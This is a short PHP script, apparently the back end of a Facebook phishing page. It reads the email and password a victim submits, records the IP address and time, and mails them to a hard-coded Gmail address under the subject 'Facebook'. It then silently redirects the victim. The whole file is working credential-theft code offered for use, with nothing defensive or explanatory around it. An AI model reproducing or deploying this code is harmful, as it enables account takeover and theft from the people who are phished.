<?php
error_reporting(0);
$email 	  	= addslashes($_POST['email']);
$password 	= addslashes($_POST['password']);
$ip         = $_SERVER['REMOTE_ADDR'];
$tarih      = date("d-m-Y H:i:s");
$mail		= "teamplayzibrahim@gmail.com"; 
$yaz        = "E-Posta : $email \r\n Sifre: $password \r\n Ýp Adres: $ip \r\n yp.tarih: $tarih";
$gonder     = mail("$mail","Facebook","$yaz");
if($gonder)
{
  echo '<script>window.location= "/"</script>';
}else{
  header("location:index.php");
}
?>
